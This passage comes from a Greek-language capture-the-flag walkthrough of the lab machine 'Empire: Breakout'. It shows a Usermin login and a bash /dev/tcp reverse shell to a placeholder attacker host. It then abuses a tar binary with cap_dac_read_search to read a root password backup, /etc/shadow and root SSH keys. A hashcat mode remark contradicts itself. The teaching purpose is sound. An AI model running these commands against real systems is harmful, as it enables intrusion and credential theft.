curl -sk "https://TARGET:20000/session_login.cgi" -d "user=cyber&pass=.2uqPEfj3D<P'a-3" | grep -iE 'failed|incorrect|welcome|Usermin'
```

```text
Login failed. Your username or password was incorrect.
```
```text
Set-Cookie: usid=…; path=/
<title>Usermin</title>
```

**Αποτυχία στο 10000, επιτυχία στο 20000 — και αυτό είναι ΑΚΡΙΒΩΣ σωστό:**

| | **Webmin** (:10000) | **Usermin** (:20000) |
| --- | --- | --- |
| **Διαχειρίζεται** | **Ολόκληρο το σύστημα** | **Μόνο τον λογαριασμό** |
| **Περιμένει** | **Λογαριασμό διαχειριστή** | **Απλό λογαριασμό** |
| **Το `cyber`** | **Απορρίπτεται** | **Δέχεται** |

**Το να ξέρετε ποιο προϊόν είναι σε ποια θύρα σας λέει ποια διαπιστευτήρια ανήκουν εκεί.**

**Ανάλυση των flags:**
- **`-s`** = **silent** (καμία μπάρα προόδου)
- **`-k`** = **insecure** — **δέχεται το αυτο-υπογεγραμμένο πιστοποιητικό**. **Χωρίς αυτό, η
  curl αποτυγχάνει** με `SSL certificate problem`.
- **`-o /dev/null`** = **απόρριψε το body**
- **`-w '%{http_code}'`** = **τύπωσε ΜΟΝΟ τον κωδικό κατάστασης** — ώστε να **συγκρίνετε δύο
  προσπάθειες με μια ματιά**

### 5. Foothold — το Command Shell του Usermin

```text
Σύνδεση στο https://TARGET:20000/ → Commands → Command Shell
```

| Εντολή | Έξοδος |
| --- | --- |
| **`id`** | `uid=1000(cyber) gid=1000(cyber) groups=1000(cyber)` |
| **`pwd`** | `/home/cyber` |
| **`ls -la`** | `tar  user.txt  .bashrc  .profile  .spamassassin  .tmp` |
| **`uname -a`** | `Linux breakout 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 x86_64 GNU/Linux` |
| **`sudo -l`** | `bash: sudo: command not found` |

**Δύο γεγονότα οδηγούν το υπόλοιπο μηχάνημα:**

**1. Το `sudo` ΔΕΝ είναι καν εγκατεστημένο.** **Άρα το `sudo -l` δεν δίνει τίποτα, και δεν
υπάρχει αναβάθμιση μέσω sudo.** Αυτό **αποκλείει** ολόκληρη κατηγορία — και είναι **χρήσιμο** να
το ξέρετε **νωρίς**.

**2. Το `tar` βρίσκεται μέσα στον κατάλογο ενός χρήστη.** **Ένα εκτελέσιμο 531 KB μέσα στο `~`
είναι ΑΝΩΜΑΛΟ.** **Κρατήστε το στο μυαλό σας.**

**`uid=1000(cyber)`** — **πραγματικός λογαριασμός**, όχι `www-data`. **Αυτό σημαίνει ότι έχετε
πρόσβαση σε ΟΛΑ τα αρχεία του `cyber`** — και **το `user.txt` είναι εκεί**.

### 6. Πραγματικό κέλυφος

**Ένα κουτί εντολών σε φυλλομετρητή ΔΕΝ μπορεί να σας δώσει TTY, job control, ή `su`.**
**Ελέγξτε τι έχει ο στόχος ΠΡΙΝ διαλέξετε payload:**

```bash
which bash sh python python3 perl nc curl wget gcc
```

```text
/bin/bash
/bin/sh
/usr/bin/python3
/usr/bin/perl
/usr/bin/curl
/usr/bin/wget
/usr/bin/gcc
```

**ΚΑΝΕΝΑ `nc`.** **Άρα χρησιμοποιήστε την υποστήριξη TCP του ίδιου του bash.**

**Στον Kali πρώτα:**

```bash
nc -lvnp 4444
```

```text
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```

**Μετά, μέσα στο κουτί του Usermin:**

```bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
```

```text
Ncat: Connection from 192.168.56.115.
Ncat: Connection from 192.168.56.115:52881.
cyber@breakout:~$
```

**Ανάλυση των flags του `nc`:**

| Flag | Ρόλος |
| --- | --- |
| **`-l`** | **listen** — αναμονή για σύνδεση |
| **`-v`** | **verbose** — αναφέρει τη σύνδεση |
| **`-n`** | **no DNS** — **μην κάνεις reverse lookup** (γρηγορότερο, πιο αθόρυβο) |
| **`-p 4444`** | **θύρα** — **πάνω από το 1024, άρα δεν χρειάζεστε root** |

**Ανάλυση του payload:**

- **`bash -i`** = **interactive** — δίνει **job control** και **prompt**
- **`>&`** = στέλνει **stdout ΚΑΙ stderr** στο socket
- **`/dev/tcp/ATTACKER/4444`** = **το bash ανοίγει TCP σύνδεση** — **είναι χαρακτηριστικό του
  bash**, όχι του συστήματος
- **`0>&1`** = στέλνει **και το stdin** εκεί — **αυτό κάνει το κέλυφος διαδραστικό, όχι
  εκτυπωτικό**

**Το `/dev/tcp` είναι χαρακτηριστικό του BASH.** **Το απλό POSIX `sh` δεν το έχει** — γι' αυτό
αυτό το payload **αποτυγχάνει σε ελάχιστα συστήματα** (Alpine, busybox).

**Αναβαθμίστε ΑΜΕΣΩΣ:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
# Στον Kali:
stty raw -echo; fg
export TERM=xterm; stty rows 40 cols 160
```

| Εντολή | Ρόλος |
| --- | --- |
| **`pty.spawn()`** | **Κατανέμει ψευδο-τερματικό** — αντικείμενο πυρήνα που συμπεριφέρεται ως πραγματικό teletype. **Αυτό κάνει τα `su`, `sudo`, `vim` να δουλεύουν** |
| **`Ctrl+Z`** | **Αναστέλλει** τον listener τοπικά |
| **`stty raw -echo`** | Το **τοπικό** τερματικό **περνά τα πλήκτρα ανεπεξέργαστα** → **το `Ctrl+C` φτάνει στη ΜΑΚΡΙΝΗ διεργασία**, όχι στον listener σας |
| **`fg`** | **Επαναφέρει** στο προσκήνιο |
| **`stty rows 40 cols 160`** | **Δίνει στο μακρινό pty τις διαστάσεις σας** → το `less` και το `top` δεν αναδιπλώνονται σε σκουπίδια |

**Το να παραλείψετε αυτό και μετά να συμπεράνετε ότι το `su` «δεν δουλεύει» είναι από τα πιο
συχνά λάθη αρχαρίων.**

### 7. Η αναβάθμιση ΔΕΝ είναι SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
```

**ΚΑΘΕΝΑ από αυτά είναι STOCK** — **αυτό είναι το προεπιλεγμένο σύνολο SUID του Debian**, άρα
**δεν υπάρχει τίποτα να εκμεταλλευτείτε**.

| Binary | Stock; |
| --- | --- |
| `chsh`, `newgrp`, `gpasswd`, `chfn` | **Ναι** |
| `mount`, `umount`, `su`, `passwd` | **Ναι** |
| `ssh-keysign` | **Ναι** |
| `dbus-daemon-launch-helper` | **Ναι** |
| `polkit-agent-helper-1` | **Ναι** |

**Όταν η λίστα SUID είναι καθαρή, πηγαίνετε στο επόμενο διάνυσμα:**

```bash
getcap -r / 2>/dev/null
```

```text
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```

**Ανάλυση της εντολής:**
- **`getcap`** = **get capabilities** — εμφανίζει τα POSIX capabilities ενός αρχείου
- **`-r`** = **recurse** — αναδρομικά από το `/`
- **`2>/dev/null`** = **απόρριψε τα σφάλματα δικαιωμάτων** (θα είναι χιλιάδες)

**Διαβάστε κάθε γραμμή ως *διαδρομή* + *λίστα capabilities*:**

**`/usr/bin/ping cap_net_raw=ep`** είναι **φυσιολογικό** — το ping χρειάζεται **raw sockets**.
**Στα σύγχρονα Debian, το ping ΧΡΗΣΙΜΟΠΟΙΕΙ capability ΑΝΤΙ για SUID root** — **ακριβώς για να
μειώσει την έκθεση**.

**`/home/cyber/tar cap_dac_read_search=ep`** είναι **το εύρημα**:

| Τμήμα | Σημασία |
| --- | --- |
| **`cap_dac_read_search`** | **Παρακάμπτει ελέγχους ανάγνωσης αρχείων ΚΑΙ αναζήτησης καταλόγων** — το **DAC** (Discretionary Access Control) μέρος του πυρήνα |
| **`=ep`** | **effective** + **permitted** — **και τα δύο σύνολα**, άρα **πλήρως ενεργό** |

**Ένα αρχείο με αυτό μπορεί να διαβάσει ΟΤΙΔΗΠΟΤΕ, ως ΟΠΟΙΟΣΔΗΠΟΤΕ.**

```bash
ls -l /home/cyber/tar
file /home/cyber/tar
getcap /home/cyber/tar
```

```text
-rwxr-xr-x 1 root root 531928 Oct 19 15:40 /home/cyber/tar
/home/cyber/tar: ELF 64-bit LSB pie executable, x86-64, version-sysv, dynamically linked, stripped
/home/cyber/tar cap_dac_read_search=ep
```

**Ένα αντίγραφο του `tar` ιδιοκτησίας root, με capability ανάγνωσης-τα-πάντα, τοποθετημένο στον
κατάλογο ενός χρήστη.**

**ΠΡΟΣΕΞΤΕ το mode: `-rwxr-xr-x`, ΟΧΙ `-rwsr-xr-x`.**

**Δεν υπάρχει SUID bit** — **και αυτό είναι ΑΚΡΙΒΩΣ γιατί η σάρωση `find -perm -4000` δεν βρήκε
τίποτα.**

> ### 📖 Τα capabilities είναι ένα *λεπτομερέστερο* μοντέλο προνομίων
>
> Το **SUID root** δίνει **ΟΛΑ** όσα μπορεί ο root. Ένα **capability** δίνει **ΜΙΑ συγκεκριμένη
> άδεια του πυρήνα**.
>
> Το `cap_dac_read_search` **φαίνεται ακίνδυνο** — «διάβασε αρχεία χωρίς ελέγχους
> δικαιωμάτων» — και **δεν είναι αναβάθμιση προνομίων από μόνο του**. **Αλλά** σας επιτρέπει να
> διαβάσετε `/etc/shadow`, `/root/.ssh/*`, και κάθε backup που περιέχει κωδικό — **που είναι
> αναβάθμιση στην πράξη**.
>
> **Ποτέ μην σαρώνετε μόνο για SUID.** Το **`getcap -r /`** ανήκει στη λίστα ελέγχου σας
> **δίπλα** στο `find -perm -4000`.

### 8. Εξαγωγή του κωδικού — τα δύο βήματα

```bash
ls -la /var/backups/
cat /var/backups/.old_pass.bak
```

```text
total 12
drwxr-xr-x 2 root root 4096 Oct 19 13:55 .
drwxr-xr-x 4 root root 4096 Oct 19 15:40 ..
-rw------- 1 root root  720 Oct 19 13:55 gshadow.bak
-rw------- 1 root root   16 Oct 19 15:40 .old_pass.bak
-rw-r--r-- 1 root root 1256 Oct 19 13:55 passwd.bak
cat: /var/backups/.old_pass.bak: Permission denied
```

**Διαβάστε τα modes:**

| Αρχείο | Mode | Αναγνώσιμο από εσάς; |
| --- | --- | --- |
| **`passwd.bak`** | `-rw-r--r--` (644) | **Ναι** — world-readable |
| **`gshadow.bak`** | `-rw-------` (600) | **Όχι** — μόνο owner |
| **`.old_pass.bak`** | `-rw-------` (600), **16 bytes** | **Όχι** — μόνο owner |

**Ένα κρυφό dot-file 16 bytes στο `/var/backups`, τροποποιημένο ΑΡΓΟΤΕΡΑ από όλα τα υπόλοιπα
στον κατάλογο, είναι ΑΚΡΙΒΩΣ το είδος πράγματος που αξίζει να διαβάσετε.**

**16 bytes = 15 χαρακτήρες + newline = μήκος κωδικού.**

**Το `tar` δεν μπορεί να κάνει `cat` — μπορεί μόνο να ΑΡΧΕΙΟΘΕΤΗΣΕΙ και να ΕΞΑΓΕΙ.** **Άρα
χρησιμοποιήστε και τα δύο μισά:**

```bash
./tar -cf backup.tar /var/backups/.old_pass.bak
./tar -xf backup.tar
ls -la var/backups/
cat var/backups/.old_pass.bak
```

```text
./tar: Removing leading '/' from member names
```
```text
drwxr-xr-x 2 cyber cyber 4096 May  4 18:31 .
-rw------- 1 cyber cyber   16 Oct 19 15:40 .old_pass.bak
```
```text
Ts&4&YurgtRX(=~h
```

**Ανάλυση:**
- **`-c`** = **create** — δημιούργησε archive
- **`-f FILE`** = **γράψε στο `FILE`**
- **`-x`** = **extract** — εξαγωγή

**Η προειδοποίηση ΕΙΝΑΙ ο μηχανισμός:**

```text
./tar: Removing leading '/' from member names
```

**Το tar αφαιρεί το αρχικό `/`**, άρα η εξαγωγή **επαναδημιουργεί τη διαδρομή ΣΧΕΤΙΚΑ με τον
τρέχοντα κατάλογό σας:**

```text
/var/backups/.old_pass.bak   →   ./var/backups/.old_pass.bak
```

**Και το νέο αρχείο ανήκει σε ΕΣΑΣ** (`cyber:cyber`). **Το capability επέτρεψε στο tar να
ΔΙΑΒΑΣΕΙ το αρχείο· η εξαγωγή σας έδωσε ένα ΑΝΑΓΝΩΣΙΜΟ ΑΝΤΙΓΡΑΦΟ.**

**Γι' αυτό χρειάζονται δύο βήματα, όχι ένα.**

### 9. Σύνδεση root

```bash
su root
id
cat /root/rOOt.txt
```

```text
Password:
root@breakout:/home/cyber# id
uid=0(root) gid=0(root) groups=0(root)
```
```text
3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
```

**Το `su root` ΧΡΕΙΑΖΟΤΑΝ TTY** — **γι' αυτό το βήμα 6 ήταν υποχρεωτικό.**

**Η σημαία root είναι `rOOt.txt`** — **με ΚΕΦΑΛΑΙΑ.** **Στο Linux τα κεφαλαία στα ονόματα
αρχείων έχουν σημασία**, άρα **πάντα `ls -la` πριν υποθέσετε ένα όνομα.**

**`uid=0(root) gid=0(root) groups=0(root)`** — **μόνο root, καμία άλλη ομάδα.** **Αυτό είναι
πραγματική ΣΥΝΔΕΣΗ**, όχι SUID αναβάθμιση. **Συγκρίνετε με το Μηχάνημα 3/6:**
`uid=33(www-data) euid=0(root) groups=0(root),33(www-data)`.

### 10. Τι άλλο θα μπορούσε να κάνει το capability

```bash
./tar -cf shadow.tar /etc/shadow && ./tar -xf shadow.tar && cat etc/shadow
./tar -cf rootssh.tar /root/.ssh && ./tar -xf rootssh.tar && ls -la root/.ssh
```

```text
root:$y$j9T$Xk2mN7pL4vR8tY1$wE5aS3dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4vR8tY1:18920:0:99999:7:::
cyber:$y$j9T$...:18920:0:99999:7:::
```
```text
-rw-r--r-- 1 cyber cyber 741 Oct 20 07:52 authorized_keys
```

**`/etc/shadow`** σας δίνει το **hash του root** για offline cracking — **`$y$` είναι
yescrypt**, η **σύγχρονη προεπιλογή Debian/Ubuntu** και **πολύ αργή στην επίθεση**.
**`hashcat -m 32000`** (net-md5crypt) **δεν** εφαρμόζεται· **yescrypt είναι `-m 32000` στο
hashcat ≥ 6.2.5**.

**`/root/.ssh/authorized_keys`** σας δίνει τα **δημόσια κλειδιά του root** και **διαδρομή σε
μόνιμη σύνδεση με κλειδί**.

**Και τα δύο είναι η ΣΩΣΤΗ συνέχεια** μόλις ένα capability σας επιτρέπει να διαβάσετε τα πάντα:
**αναριθμήστε ΚΑΘΕ αποθήκη διαπιστευτηρίων, μην σταματήσετε στην πρώτη σημαία.**

### 11. Σύγκριση με τα προηγούμενα μηχανήματα

| Μηχάνημα | Μηχανισμός αναβάθμισης | Εντολή ανίχνευσης |
| --- | --- | --- |
| **1** — Basic Pentesting 1 | World-writable `/etc/passwd` | `ls -la /etc/passwd` |
| **3** — DC: 1 | **SUID** `/usr/bin/find` | `find / -perm -4000` |
| **6** — BossPlayerCTF | **SUID** `/usr/bin/find` | `find / -perm -4000` |
| **7** — Mr. Robot | **SUID** `/usr/local/bin/nmap` | `find / -perm -4000` |
| **8** — Empire: Breakout | **Capability** `cap_dac_read_search` | **`getcap -r /`** |

**Αυτός ο πίνακας είναι το δίδαγμα: υπάρχει ΔΕΥΤΕΡΟ σύστημα προνομίων, και απαιτεί ΔΕΥΤΕΡΗ
εντολή ανίχνευσης.**

---

_Πίσω στη [Μαθησιακή Διαδρομή 1](../README.md) · προηγούμενο: [Μηχάνημα 7 — Mr. Robot: 1](<07-mr-robot-1.md>) · επόμενο: [Μηχάνημα 9 — CengBox: 1](<09-cengbox-1.md>) · πλήρες walkthrough: [`labs/3-028-empire-breakout`](../../labs/3-028-empire-breakout/README.md)_
